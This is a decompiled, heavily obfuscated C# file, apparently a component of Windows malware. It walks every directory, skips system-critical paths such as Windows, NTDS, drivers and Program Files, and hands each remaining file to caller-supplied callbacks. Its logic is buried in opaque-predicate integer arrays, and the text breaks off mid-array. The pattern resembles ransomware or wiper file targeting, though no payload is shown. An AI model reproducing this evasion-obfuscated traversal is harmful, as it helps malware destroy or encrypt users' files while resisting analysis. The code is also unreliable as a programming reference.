using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace ns0;

public static class GClass4
{
	private const string string_0 = "Microsoft";

	private const string string_1 = "Windows";

	private const string string_2 = "drivers";

	private const string string_3 = "NTDS";

	private const string string_4 = "Microsoft.NET";

	private const string string_5 = "Fonts";

	private const string string_6 = "Documents and Settings";

	private const string string_7 = "ProgramData";

	private const string string_8 = "Application Data";

	private const string string_9 = "Users";

	private const string string_10 = "All Users";

	private const string string_11 = "Default User";

	private const string string_12 = "AppData";

	private const string string_13 = "Local";

	private const string string_14 = "Roaming";

	private const string string_15 = "Local Settings";

	private const string string_16 = "Start Menu";

	private const int int_0 = 5;

	private static string string_17 = Path.Combine(smethod_0(), "Windows");

	private static string string_18 = Path.Combine(smethod_0(), "Windows", "Microsoft.NET");

	public static readonly IEnumerable<Regex> ienumerable_0 = new List<Regex>
	{
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\Local Settings.*", RegexOptions.IgnoreCase | RegexOptions.Compiled),
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\AppData\\\\Local\\\\Application Data.*", RegexOptions.IgnoreCase | RegexOptions.Compiled),
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\Start Menu.*", RegexOptions.IgnoreCase | RegexOptions.Compiled),
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\Application Data.*", RegexOptions.IgnoreCase | RegexOptions.Compiled),
		new Regex(smethod_0() + "\\ProgramData\\\\Microsoft.*", RegexOptions.IgnoreCase | RegexOptions.Compiled)
	};

	public static readonly IEnumerable<Regex> ienumerable_1 = new List<Regex>();

	public static readonly IEnumerable<Regex> ienumerable_2 = new List<Regex>
	{
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\AppData\\\\Local\\\\Microsoft.*", RegexOptions.IgnoreCase | RegexOptions.Compiled),
		new Regex(smethod_0() + "\\Users\\\\.*?\\\\AppData\\\\Roaming\\\\Microsoft.*", RegexOptions.IgnoreCase | RegexOptions.Compiled)
	};

	public static readonly IEnumerable<Regex> ienumerable_3 = new List<Regex>();

	public static readonly IEnumerable<string> ienumerable_4 = new List<string>
	{
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)),
		Path.Combine(smethod_0(), "Documents and Settings"),
		Path.Combine(smethod_0(), "ProgramData", "Application Data"),
		Path.Combine(smethod_0(), "Users", "All Users"),
		Path.Combine(smethod_0(), "Users", "Default User")
	};

	public static readonly IEnumerable<string> ienumerable_5 = new List<string> { Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers") };

	public static readonly IEnumerable<string> ienumerable_6 = new List<string> { Path.Combine(smethod_0(), "Windows", "NTDS") };

	public static readonly IEnumerable<string> ienumerable_7 = new List<string> { Path.Combine(smethod_0(), "Windows") };

	public static string smethod_0()
	{
		return Path.GetPathRoot(Environment.SystemDirectory);
	}

	public static int smethod_1()
	{
		return Environment.OSVersion.Version.Major;
	}

	public static IEnumerable<GClass3> smethod_2(string string_19, IList<Func<string, bool>> ilist_0, bool bool_0 = false)
	{
		List<GClass3> list = new List<GClass3>();
		int i = 0;
		object[] array = new object[13]
		{
			new int[6] { 90, -876604766, 90, 876604916, 10, 180 },
			new int[9] { 90, -235178641, 90, 641426141, 20, 90, 876604916, 10, 180 },
			new int[6] { 90, -876604851, 90, 876604916, 10, 180 },
			new int[12]
			{
				90, -1876814830, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
				10, 180
			},
			new int[6] { 90, -876604788, 90, 876604916, 10, 180 },
			new int[12]
			{
				90, -1876815062, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
				10, 180
			},
			new int[9] { 90, -235178470, 90, 641426141, 20, 90, 876604916, 10, 180 },
			new int[6] { 90, -876604431, 90, 876604916, 10, 180 },
			new int[9] { 90, -235178301, 90, 641426141, 20, 90, 876604916, 10, 180 },
			new int[6] { 90, -876604720, 90, 876604916, 10, 180 },
			new int[9] { 90, -235178594, 90, 641426141, 20, 90, 876604916, 10, 180 },
			new int[9] { 90, -235178589, 90, 641426141, 20, 90, 876604916, 10, 180 },
			new int[9] { 90, -235178434, 90, 641426141, 20, 90, 876604916, 10, 180 }
		};
		for (; i < 13; i++)
		{
			switch (ortC7CNAc.k50Yftse39kH((int[])array[i], 0, 0))
			{
			case 186:
				try
				{
					string[] directories = Directory.GetDirectories(string_19);
					int j = 0;
					object[] array2 = new object[5]
					{
						new int[12]
						{
							90, -1876815016, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
							10, 180
						},
						new int[9] { 90, -235178580, 90, 641426141, 20, 90, 876604916, 10, 180 },
						new int[12]
						{
							90, -1876814943, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
							10, 180
						},
						new int[6] { 90, -876604748, 90, 876604916, 10, 180 },
						new int[12]
						{
							90, -1876814986, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
							10, 180
						}
					};
					for (; j < 5; j++)
					{
						int num = ortC7CNAc.k50Yftse39kH((int[])array2[j], 0, 0);
						if (num == 135 || num != 168)
						{
							continue;
						}
						try
						{
							int k = 0;
							object[] array3 = new object[5]
							{
								new int[9] { 90, -235178694, 90, 641426141, 20, 90, 876604916, 10, 180 },
								new int[12]
								{
									90, -1876814991, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
									10, 180
								},
								new int[9] { 90, -235178703, 90, 641426141, 20, 90, 876604916, 10, 180 },
								new int[12]
								{
									90, -1876814994, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
									10, 180
								},
								new int[12]
								{
									90, -1876815043, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
									10, 180
								}
							};
							for (; k < 5; k++)
							{
								int num2 = ortC7CNAc.k50Yftse39kH((int[])array3[k], 0, 0);
								if (num2 == 78 || num2 != 128)
								{
									continue;
								}
								string[] array4 = directories;
								foreach (string string_20 in array4)
								{
									int m = 0;
									object[] array5 = new object[5]
									{
										new int[12]
										{
											90, -1876815028, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
											10, 180
										},
										new int[6] { 90, -876604813, 90, 876604916, 10, 180 },
										new int[12]
										{
											90, -1876814999, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
											10, 180
										},
										new int[12]
										{
											90, -1876815097, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
											10, 180
										},
										new int[9] { 90, -235178702, 90, 641426141, 20, 90, 876604916, 10, 180 }
									};
									for (; m < 5; m++)
									{
										switch (ortC7CNAc.k50Yftse39kH((int[])array5[m], 0, 0))
										{
										case 25:
											try
											{
												int n = 0;
												object[] array6 = new object[5]
												{
													new int[6] { 90, -876604770, 90, 876604916, 10, 180 },
													new int[6] { 90, -876604738, 90, 876604916, 10, 180 },
													new int[12]
													{
														90, -1876814952, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
														10, 180
													},
													new int[12]
													{
														90, -1876815077, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
														10, 180
													},
													new int[9] { 90, -235178614, 90, 641426141, 20, 90, 876604916, 10, 180 }
												};
												for (; n < 5; n++)
												{
													switch (ortC7CNAc.k50Yftse39kH((int[])array6[n], 0, 0))
													{
													case 45:
													{
														int num3 = 0;
														object[] array7 = new object[5]
														{
															new int[12]
															{
																90, -1876815120, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																10, 180
															},
															new int[6] { 90, -876604867, 90, 876604916, 10, 180 },
															new int[9] { 90, -235178671, 90, 641426141, 20, 90, 876604916, 10, 180 },
															new int[9] { 90, -235178691, 90, 641426141, 20, 90, 876604916, 10, 180 },
															new int[6] { 90, -876604822, 90, 876604916, 10, 180 }
														};
														for (; num3 < 5; num3++)
														{
															switch (ortC7CNAc.k50Yftse39kH((int[])array7[num3], 0, 0))
															{
															case 84:
																list.AddRange(smethod_2(string_20, ilist_0, bool_0));
																break;
															}
														}
														break;
													}
													}
												}
											}
											catch (Exception ex)
											{
												int num4 = 0;
												object[] array8 = new object[5]
												{
													new int[9] { 90, -235178696, 90, 641426141, 20, 90, 876604916, 10, 180 },
													new int[12]
													{
														90, -1876815062, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
														10, 180
													},
													new int[9] { 90, -235178586, 90, 641426141, 20, 90, 876604916, 10, 180 },
													new int[12]
													{
														90, -1876814998, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
														10, 180
													},
													new int[6] { 90, -876604883, 90, 876604916, 10, 180 }
												};
												for (; num4 < 5; num4++)
												{
													int num5 = ortC7CNAc.k50Yftse39kH((int[])array8[num4], 0, 0);
													if (num5 != 32 && num5 == 124 && ex.Message != "Paosn3")
													{
														throw ex;
													}
												}
											}
											break;
										}
									}
								}
							}
						}
						catch (Exception ex2)
						{
							int num6 = 0;
							object[] array9 = new object[5]
							{
								new int[12]
								{
									90, -1876814969, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
									10, 180
								},
								new int[9] { 90, -235178598, 90, 641426141, 20, 90, 876604916, 10, 180 },
								new int[9] { 90, -235178729, 90, 641426141, 20, 90, 876604916, 10, 180 },
								new int[9] { 90, -235178643, 90, 641426141, 20, 90, 876604916, 10, 180 },
								new int[6] { 90, -876604886, 90, 876604916, 10, 180 }
							};
							for (; num6 < 5; num6++)
							{
								int num2 = ortC7CNAc.k50Yftse39kH((int[])array9[num6], 0, 0);
								if (num2 != 29 && num2 == 132 && ex2.Message != "SFod3")
								{
									throw ex2;
								}
							}
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch (Exception)
				{
				}
				break;
			case 181:
				try
				{
					List<string> list2 = Directory.GetFiles(string_19).ToList();
					int num8 = 0;
					object[] array11 = new object[5]
					{
						new int[12]
						{
							90, -1876814974, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
							10, 180
						},
						new int[9] { 90, -235178711, 90, 641426141, 20, 90, 876604916, 10, 180 },
						new int[6] { 90, -876604852, 90, 876604916, 10, 180 },
						new int[6] { 90, -876604770, 90, 876604916, 10, 180 },
						new int[6] { 90, -876604723, 90, 876604916, 10, 180 }
					};
					for (; num8 < 5; num8++)
					{
						switch (ortC7CNAc.k50Yftse39kH((int[])array11[num8], 0, 0))
						{
						case 146:
							try
							{
								int num9 = 0;
								object[] array12 = new object[5]
								{
									new int[12]
									{
										90, -1876814972, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									},
									new int[12]
									{
										90, -1876814957, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									},
									new int[6] { 90, -876604873, 90, 876604916, 10, 180 },
									new int[12]
									{
										90, -1876815036, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									},
									new int[12]
									{
										90, -1876815011, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									}
								};
								for (; num9 < 5; num9++)
								{
									switch (ortC7CNAc.k50Yftse39kH((int[])array12[num9], 0, 0))
									{
									case 86:
										foreach (string item in list2)
										{
											int num10 = 0;
											object[] array13 = new object[5]
											{
												new int[6] { 90, -876604775, 90, 876604916, 10, 180 },
												new int[9] { 90, -235178757, 90, 641426141, 20, 90, 876604916, 10, 180 },
												new int[9] { 90, -235178744, 90, 641426141, 20, 90, 876604916, 10, 180 },
												new int[9] { 90, -235178617, 90, 641426141, 20, 90, 876604916, 10, 180 },
												new int[12]
												{
													90, -1876814954, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
													10, 180
												}
											};
											for (; num10 < 5; num10++)
											{
												switch (ortC7CNAc.k50Yftse39kH((int[])array13[num10], 0, 0))
												{
												case 158:
													try
													{
														int num11 = 0;
														object[] array14 = new object[5]
														{
															new int[9] { 90, -235178722, 90, 641426141, 20, 90, 876604916, 10, 180 },
															new int[9] { 90, -235178636, 90, 641426141, 20, 90, 876604916, 10, 180 },
															new int[9] { 90, -235178667, 90, 641426141, 20, 90, 876604916, 10, 180 },
															new int[6] { 90, -876604832, 90, 876604916, 10, 180 },
															new int[9] { 90, -235178692, 90, 641426141, 20, 90, 876604916, 10, 180 }
														};
														for (; num11 < 5; num11++)
														{
															int num12 = ortC7CNAc.k50Yftse39kH((int[])array14[num11], 0, 0);
															if (num12 == 82 || num12 != 84)
															{
																continue;
															}
															int num13 = 0;
															object[] array15 = new object[5]
															{
																new int[12]
																{
																	90, -1876814987, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																	10, 180
																},
																new int[9] { 90, -235178587, 90, 641426141, 20, 90, 876604916, 10, 180 },
																new int[9] { 90, -235178662, 90, 641426141, 20, 90, 876604916, 10, 180 },
																new int[12]
																{
																	90, -1876814957, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																	10, 180
																},
																new int[9] { 90, -235178766, 90, 641426141, 20, 90, 876604916, 10, 180 }
															};
															for (; num13 < 5; num13++)
															{
																int num5 = ortC7CNAc.k50Yftse39kH((int[])array15[num13], 0, 0);
																if (num5 != 8 && num5 == 165)
																{
																	GClass7.smethod_1(item);
																}
															}
															GEnum1 gEnum = GEnum1.Safe;
															int num14 = 0;
															object[] array16 = new object[5]
															{
																new int[12]
																{
																	90, -1876814988, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																	10, 180
																},
																new int[12]
																{
																	90, -1876815075, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																	10, 180
																},
																new int[6] { 90, -876604896, 90, 876604916, 10, 180 },
																new int[12]
																{
																	90, -1876815098, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																	10, 180
																},
																new int[6] { 90, -876604850, 90, 876604916, 10, 180 }
															};
															for (; num14 < 5; num14++)
															{
																switch (ortC7CNAc.k50Yftse39kH((int[])array16[num14], 0, 0))
																{
																case 66:
																{
																	if (gEnum == GEnum1.Safe)
																	{
																		int num16 = 0;
																		object[] array18 = new object[5]
																		{
																			new int[6] { 90, -876604826, 90, 876604916, 10, 180 },
																			new int[9] { 90, -235178621, 90, 641426141, 20, 90, 876604916, 10, 180 },
																			new int[12]
																			{
																				90, -1876815042, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																				10, 180
																			},
																			new int[6] { 90, -876604837, 90, 876604916, 10, 180 },
																			new int[9] { 90, -235178609, 90, 641426141, 20, 90, 876604916, 10, 180 }
																		};
																		for (; num16 < 5; num16++)
																		{
																			switch (ortC7CNAc.k50Yftse39kH((int[])array18[num16], 0, 0))
																			{
																			case 79:
																				try
																				{
																					int num17 = 0;
																					object[] array19 = new object[5]
																					{
																						new int[9] { 90, -235178604, 90, 641426141, 20, 90, 876604916, 10, 180 },
																						new int[12]
																						{
																							90, -1876815101, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																							10, 180
																						},
																						new int[9] { 90, -235178660, 90, 641426141, 20, 90, 876604916, 10, 180 },
																						new int[9] { 90, -235178610, 90, 641426141, 20, 90, 876604916, 10, 180 },
																						new int[12]
																						{
																							90, -1876814953, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																							10, 180
																						}
																					};
																					for (; num17 < 5; num17++)
																					{
																						switch (ortC7CNAc.k50Yftse39kH((int[])array19[num17], 0, 0))
																						{
																						case 165:
																						{
																							if (smethod_1() > 5)
																							{
																								bool flag = false;
																								int num18 = 0;
																								object[] array20 = new object[7]
																								{
																									new int[12]
																									{
																										90, -1301714764, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																										20, 180
																									},
																									new int[12]
																									{
																										90, -1301714716, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																										20, 180
																									},
																									new int[6] { 90, 106077182, 90, 106076988, 20, 180 },
																									new int[6] { 90, 106077270, 90, 106076988, 20, 180 },
																									new int[6] { 90, 106077056, 90, 106076988, 20, 180 },
																									new int[6] { 90, 106076988, 90, 106076988, 20, 180 },
																									new int[6] { 90, 106077189, 90, 106076988, 20, 180 }
																								};
																								for (; num18 < 7; num18++)
																								{
																									switch (ortC7CNAc.k50Yftse39kH((int[])array20[num18], 0, 0))
																									{
																									case 68:
																										try
																										{
																											int num21 = 0;
																											object[] array22 = new object[5]
																											{
																												new int[9] { 90, -140624766, 90, 246701794, 10, 90, 106076988, 20, 180 },
																												new int[9] { 90, -140624640, 90, 246701794, 10, 90, 106076988, 20, 180 },
																												new int[12]
																												{
																													90, -1301714750, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																													20, 180
																												},
																												new int[6] { 90, 106076993, 90, 106076988, 20, 180 },
																												new int[6] { 90, 106077092, 90, 106076988, 20, 180 }
																											};
																											for (; num21 < 5; num21++)
																											{
																												switch (ortC7CNAc.k50Yftse39kH((int[])array22[num21], 0, 0))
																												{
																												case 5:
																													flag = ilist_0[ortC7CNAc.k50Yftse39kH(new int[13]
																													{
																														90, 2141163960, 90, 2141163960, 190, 210, 220, 190, 210, 220,
																														270, 230, 180
																													}, 0, 0)](item);
																													break;
																												}
																											}
																										}
																										catch (Exception)
																										{
																										}
																										break;
																									case 0:
																									{
																										if (flag)
																										{
																											break;
																										}
																										int num19 = 0;
																										object[] array21 = new object[5]
																										{
																											new int[12]
																											{
																												90, -1301714644, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																												20, 180
																											},
																											new int[9] { 90, -140624670, 90, 246701794, 10, 90, 106076988, 20, 180 },
																											new int[12]
																											{
																												90, -1301714754, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																												20, 180
																											},
																											new int[12]
																											{
																												90, -1301714690, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																												20, 180
																											},
																											new int[9] { 90, -140624706, 90, 246701794, 10, 90, 106076988, 20, 180 }
																										};
																										for (; num19 < 5; num19++)
																										{
																											int num20 = ortC7CNAc.k50Yftse39kH((int[])array21[num19], 0, 0);
																											if (num20 != 99 && num20 == 104)
																											{
																												ilist_0[ortC7CNAc.k50Yftse39kH(new int[13]
																												{
																													90, 2141163960, 190, 210, 220, 90, 2141163960, 190, 200, 220,
																													240, 230, 180
																												}, 0, 0)](item);
																											}
																										}
																										break;
																									}
																									}
																								}
																								break;
																							}
																							int num22 = 0;
																							object[] array23 = new object[5]
																							{
																								new int[6] { 90, 106077180, 90, 106076988, 20, 180 },
																								new int[12]
																								{
																									90, -1301714697, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																									20, 180
																								},
																								new int[12]
																								{
																									90, -1301714711, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																									20, 180
																								},
																								new int[6] { 90, 106077111, 90, 106076988, 20, 180 },
																								new int[9] { 90, -140624640, 90, 246701794, 10, 90, 106076988, 20, 180 }
																							};
																							for (; num22 < 5; num22++)
																							{
																								switch (ortC7CNAc.k50Yftse39kH((int[])array23[num22], 0, 0))
																								{
																								case 123:
																									ilist_0[ortC7CNAc.k50Yftse39kH(new int[13]
																									{
																										90, 2141163960, 190, 210, 220, 90, 2141163960, 190, 200, 220,
																										240, 230, 180
																									}, 0, 0)](item);
																									break;
																								}
																							}
																							break;
																						}
																						}
																					}
																				}
																				catch (Exception)
																				{
																				}
																				break;
																			}
																		}
																		break;
																	}
																	int num23 = 0;
																	object[] array24 = new object[5]
																	{
																		new int[6] { 90, -876604858, 90, 876604916, 10, 180 },
																		new int[6] { 90, -876604832, 90, 876604916, 10, 180 },
																		new int[9] { 90, -235178579, 90, 641426141, 20, 90, 876604916, 10, 180 },
																		new int[12]
																		{
																			90, -1876815070, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																			10, 180
																		},
																		new int[9] { 90, -235178624, 90, 641426141, 20, 90, 876604916, 10, 180 }
																	};
																	for (; num23 < 5; num23++)
																	{
																		switch (ortC7CNAc.k50Yftse39kH((int[])array24[num23], 0, 0))
																		{
																		case 52:
																			list.Add(new GClass3
																			{
																				String_0 = item,
																				GEnum1_0 = gEnum
																			});
																			break;
																		}
																	}
																	break;
																}
																case 24:
																{
																	if (!bool_0)
																	{
																		break;
																	}
																	int num15 = 0;
																	object[] array17 = new object[5]
																	{
																		new int[6] { 90, 106077048, 90, 106076988, 20, 180 },
																		new int[12]
																		{
																			90, -1301714780, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																			20, 180
																		},
																		new int[12]
																		{
																			90, -1301714771, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
																			20, 180
																		},
																		new int[9] { 90, -140624753, 90, 246701794, 10, 90, 106076988, 20, 180 },
																		new int[6] { 90, 106077088, 90, 106076988, 20, 180 }
																	};
																	for (; num15 < 5; num15++)
																	{
																		switch (ortC7CNAc.k50Yftse39kH((int[])array17[num15], 0, 0))
																		{
																		case 53:
																			gEnum = smethod_6(string_19);
																			break;
																		}
																	}
																	break;
																}
																}
															}
														}
													}
													catch (Exception ex8)
													{
														int num24 = 0;
														object[] array25 = new object[5]
														{
															new int[12]
															{
																90, -1876815053, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																10, 180
															},
															new int[6] { 90, -876604878, 90, 876604916, 10, 180 },
															new int[12]
															{
																90, -1876815093, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																10, 180
															},
															new int[6] { 90, -876604768, 90, 876604916, 10, 180 },
															new int[12]
															{
																90, -1876815012, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
																10, 180
															}
														};
														for (; num24 < 5; num24++)
														{
															int num12 = ortC7CNAc.k50Yftse39kH((int[])array25[num24], 0, 0);
															if (num12 != 109 && num12 == 148 && ex8.Message != "Paosn3")
															{
																throw ex8;
															}
														}
													}
													break;
												}
											}
										}
										break;
									}
								}
							}
							catch (Exception ex9)
							{
								int num25 = 0;
								object[] array26 = new object[5]
								{
									new int[12]
									{
										90, -1876815057, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									},
									new int[6] { 90, -876604890, 90, 876604916, 10, 180 },
									new int[9] { 90, -235178716, 90, 641426141, 20, 90, 876604916, 10, 180 },
									new int[12]
									{
										90, -1876814968, 90, 1641636347, 10, 90, 641426141, 20, 90, 876604916,
										10, 180
									},
									new int[6] { 90, -876604833, 90, 876604916, 10, 180 }
								};
								for (; num25 < 5; num25++)
								{
									int num2 = ortC7CNAc.k50Yftse39kH((int[])array26[num25], 0, 0);
									if (num2 != 82 && num2 == 154 && ex9.Message != "SFod3")
									{
										throw ex9;
									}
								}
							}
							break;
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (PathTooLongException)
				{
					return list;
				}
				catch (Exception)
				{
				}
				break;
			case 474:
			{
				if (!bool_0)
				{
					break;
				}
				int num7 = 0;
				object[] array10 = new object[7]
				{
					new int[6] { 90, 106077170, 90, 106076988, 20, 180 },
					new int[6] { 90, 106077245, 90, 106076988, 20, 180 },
					new int[12]
					{
						90, -1301714781, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
						20, 180
					},
					new int[6] { 90, 106077003, 90, 106076988, 20, 180 },
					new int[12]
					{
						90, -1301714752, 90, 1161089988, 10, 90, 246701794, 10, 90, 106076988,
						20, 180
					},
					new int[6] { 90, 106077194, 90, 106076988, 20, 180 },
					new int[9] { 90, -140624572, 90, 246701794, 10, 90, 106076988, 20, 180 }
				};
				for (; num7 < 7; num7++)
				{
					switch (ortC7CNAc.k50Yftse39kH((int[])array10[num7], 0, 0))
					{
					case 206:
						if (smethod_5(string_19))
						{
							return list;
						}
						break;
					case 13:
						if (smethod_3(string_19))
						{
							return list;
						}
						break;
					}
				}
				break;
			}
			case 305:
				if (smethod_4(string_19))
				{
					return list;
				}
				break;
			}
		}
		return list;
	}

	public static bool smethod_3(string string_19)
	{
		return string_19.StartsWith(string_17, StringComparison.OrdinalIgnoreCase);
	}

	public static bool smethod_4(string string_19)
	{
		return string_19.StartsWith(string_18, StringComparison.OrdinalIgnoreCase);
	}

	public static bool smethod_5(string string_19)
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[9] { 90, 1611684134, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
			new int[6] { 90, -1647132837, 90, 1647132844, 10, 180 },
			new int[6] { 90, -1647132717, 90, 1647132844, 10, 180 },
			new int[9] { 90, 1611684072, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
			new int[6] { 90, -1647132767, 90, 1647132844, 10, 180 }
		};
		for (; i < 5; i++)
		{
			int num = ortC7CNAc.k50Yftse39kH((int[])array[i], 0, 0);
			if (num == 76 || num != 108 || smethod_1() <= 5)
			{
				continue;
			}
			int j = 0;
			object[] array2 = new object[7]
			{
				new int[6] { 90, -1647132696, 90, 1647132844, 10, 180 },
				new int[6] { 90, -1647132569, 90, 1647132844, 10, 180 },
				new int[9] { 90, 1611684105, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
				new int[9] { 90, 1611684231, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
				new int[9] { 90, 1611684035, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
				new int[6] { 90, -1647132691, 90, 1647132844, 10, 180 },
				new int[6] { 90, -1647132676, 90, 1647132844, 10, 180 }
			};
			for (; j < 7; j++)
			{
				switch (ortC7CNAc.k50Yftse39kH((int[])array2[j], 0, 0))
				{
				case 153:
					try
					{
						int num7 = 0;
						object[] array9 = new object[5]
						{
							new int[9] { 90, 1611684098, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
							new int[12]
							{
								90, -510498703, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[9] { 90, 1611684122, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
							new int[12]
							{
								90, -510498582, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[6] { 90, -1647132767, 90, 1647132844, 10, 180 }
						};
						for (; num7 < 5; num7++)
						{
							int num2 = ortC7CNAc.k50Yftse39kH((int[])array9[num7], 0, 0);
							if (num2 == 76 || num2 != 160)
							{
								continue;
							}
							foreach (Regex item in ienumerable_0)
							{
								int num8 = 0;
								object[] array10 = new object[5]
								{
									new int[9] { 90, 1611684030, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[9] { 90, 1611684092, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[6] { 90, -1647132662, 90, 1647132844, 10, 180 },
									new int[6] { 90, -1647132799, 90, 1647132844, 10, 180 },
									new int[12]
									{
										90, -510498703, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
										10, 180
									}
								};
								for (; num8 < 5; num8++)
								{
									int num3 = ortC7CNAc.k50Yftse39kH((int[])array10[num8], 0, 0);
									if (num3 == 38 || num3 != 45)
									{
										continue;
									}
									try
									{
										int num9 = 0;
										object[] array11 = new object[5]
										{
											new int[12]
											{
												90, -510498590, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[12]
											{
												90, -510498718, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[12]
											{
												90, -510498668, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[6] { 90, -1647132750, 90, 1647132844, 10, 180 },
											new int[6] { 90, -1647132693, 90, 1647132844, 10, 180 }
										};
										for (; num9 < 5; num9++)
										{
											switch (ortC7CNAc.k50Yftse39kH((int[])array11[num9], 0, 0))
											{
											case 94:
											{
												int num10 = 0;
												object[] array12 = new object[5]
												{
													new int[9] { 90, 1611684103, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[9] { 90, 1611684032, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498681, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[6] { 90, -1647132736, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498570, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													}
												};
												for (; num10 < 5; num10++)
												{
													switch (ortC7CNAc.k50Yftse39kH((int[])array12[num10], 0, 0))
													{
													case 108:
														if (item.IsMatch(string_19))
														{
															return true;
														}
														break;
													}
												}
												break;
											}
											}
										}
									}
									catch (Exception ex3)
									{
										int num11 = 0;
										object[] array13 = new object[5]
										{
											new int[6] { 90, -1647132761, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684099, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[12]
											{
												90, -510498573, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[12]
											{
												90, -510498598, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[12]
											{
												90, -510498628, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											}
										};
										for (; num11 < 5; num11++)
										{
											int num5 = ortC7CNAc.k50Yftse39kH((int[])array13[num11], 0, 0);
											if (num5 != 113 && num5 == 144 && ex3.Message != "Paosn3")
											{
												throw ex3;
											}
										}
									}
								}
							}
						}
					}
					catch (Exception ex4)
					{
						int num12 = 0;
						object[] array14 = new object[5]
						{
							new int[12]
							{
								90, -510498732, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[12]
							{
								90, -510498631, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[12]
							{
								90, -510498613, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[6] { 90, -1647132789, 90, 1647132844, 10, 180 },
							new int[12]
							{
